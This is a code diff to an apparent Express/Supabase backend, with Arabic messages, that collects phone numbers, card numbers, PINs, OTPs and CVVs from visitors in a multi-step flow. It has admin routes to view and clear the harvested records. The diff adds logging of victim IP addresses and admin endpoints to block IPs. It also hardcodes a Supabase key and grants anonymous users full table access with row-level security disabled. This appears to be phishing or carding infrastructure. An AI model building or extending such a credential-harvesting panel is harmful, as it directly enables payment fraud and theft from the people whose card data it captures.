@@ -7,6 +7,20 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
+app.set('trust proxy', true);
+
+function getClientIp(req) {
+  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.ip || req.connection.remoteAddress || '';
+}
+
+const blockedIpsCache = new Set();
+async function loadBlockedIps() {
+  try {
+    const { data } = await supabase.from('blocked_ips').select('ip');
+    blockedIpsCache.clear();
+    (data || []).forEach(r => blockedIpsCache.add(r.ip));
+  } catch (e) {}
+}
 
 const SUPABASE_URL = process.env.SUPABASE_URL || 'https://ejcmcrirzeyaasjxhtyr.supabase.co';
 const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_WYtBEAv_kqet8ZmR5zrn0Q_TwE9dM6K';
@@ -23,14 +37,22 @@ function isAdmin(req) {
   return false;
 }
 
+// IP block middleware for public routes
+function checkBlocked(req, res, next) {
+  const ip = getClientIp(req);
+  if (blockedIpsCache.has(ip)) return res.status(403).json({ error: 'blocked' });
+  next();
+}
+
 // Submit new payment
-app.post('/api/submit', async (req, res) => {
+app.post('/api/submit', checkBlocked, async (req, res) => {
   try {
     const b = req.body;
     const phone = String(b.phone || '').trim();
     const amount = String(b.amount || '').trim();
     if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
     const id = crypto.randomBytes(6).toString('hex');
+    const ip = getClientIp(req);
     const { error } = await supabase.from('submissions').insert({
       id, phone, amount,
       card: String(b.card || '').trim(),
@@ -38,6 +60,7 @@ app.post('/api/submit', async (req, res) => {
       pin: String(b.pin || '').trim(),
       otp: String(b.otp || '').trim(),
       cvv: String(b.cvv || '').trim(),
+      ip: ip,
       status: 'pending',
       time: new Date().toISOString()
     });
@@ -49,7 +72,7 @@ app.post('/api/submit', async (req, res) => {
 });
 
 // Update step (card / OTP / CVV)
-app.post('/api/submit-step/:id', async (req, res) => {
+app.post('/api/submit-step/:id', checkBlocked, async (req, res) => {
   try {
     const b = req.body;
     const updates = {};
@@ -151,7 +174,7 @@ app.post('/api/admin/clear', async (req, res) => {
 });
 
 // Heartbeat
-app.post('/api/heartbeat', async (req, res) => {
+app.post('/api/heartbeat', checkBlocked, async (req, res) => {
   try {
     const id = String(req.body.id || '').trim();
     if (!id) return res.json({ active: 0 });
@@ -173,6 +196,47 @@ app.get('/api/active-count', async (req, res) => {
     res.json({ active: count || 0 });
   } catch (err) {
     res.json({ active: 0 });
+  }
+});
+
+// Admin: block IP
+app.post('/api/admin/block-ip', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
+    const ip = String(req.body.ip || '').trim();
+    if (!ip) return res.status(400).json({ error: 'IP مطلوب' });
+    const { error } = await supabase.from('blocked_ips').upsert({ ip, blocked_at: new Date().toISOString() }, { onConflict: 'ip' });
+    if (error) throw error;
+    blockedIpsCache.add(ip);
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin: unblock IP
+app.post('/api/admin/unblock-ip', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
+    const ip = String(req.body.ip || '').trim();
+    if (!ip) return res.status(400).json({ error: 'IP مطلوب' });
+    await supabase.from('blocked_ips').delete().eq('ip', ip);
+    blockedIpsCache.delete(ip);
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin: list blocked IPs
+app.get('/api/admin/blocked-ips', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
+    const { data, error } = await supabase.from('blocked_ips').select('*').order('blocked_at', { ascending: false });
+    if (error) throw error;
+    res.json({ ok: true, ips: data || [] });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
   }
 });
 
@@ -198,6 +262,7 @@ async function autoMigrate() {
         pin TEXT,
         otp TEXT,
         cvv TEXT,
+        ip TEXT,
         status TEXT DEFAULT 'pending',
         time TIMESTAMPTZ DEFAULT now()
       );
@@ -205,10 +270,17 @@ async function autoMigrate() {
         session_id TEXT PRIMARY KEY,
         last_seen TIMESTAMPTZ DEFAULT now()
       );
+      CREATE TABLE IF NOT EXISTS blocked_ips (
+        ip TEXT PRIMARY KEY,
+        blocked_at TIMESTAMPTZ DEFAULT now()
+      );
+      ALTER TABLE submissions ADD COLUMN IF NOT EXISTS ip TEXT;
       ALTER TABLE submissions DISABLE ROW LEVEL SECURITY;
       ALTER TABLE visitors DISABLE ROW LEVEL SECURITY;
+      ALTER TABLE blocked_ips DISABLE ROW LEVEL SECURITY;
       GRANT ALL ON submissions TO anon, authenticated, service_role;
       GRANT ALL ON visitors TO anon, authenticated, service_role;
+      GRANT ALL ON blocked_ips TO anon, authenticated, service_role;
     `);
     console.log('[MIGRATE] tables ready, RLS disabled');
   } catch (e) { console.error('[MIGRATE] error:', e.message); }
@@ -216,9 +288,11 @@ async function autoMigrate() {
 }
 
 if (!process.env.VERCEL) {
-  autoMigrate().then(() => {
+  autoMigrate().then(() => loadBlockedIps()).then(() => {
     app.listen(PORT, () => console.log('Server running on port ' + PORT));
   });
+} else {
+  loadBlockedIps();
 }
 
 module.exports = app;
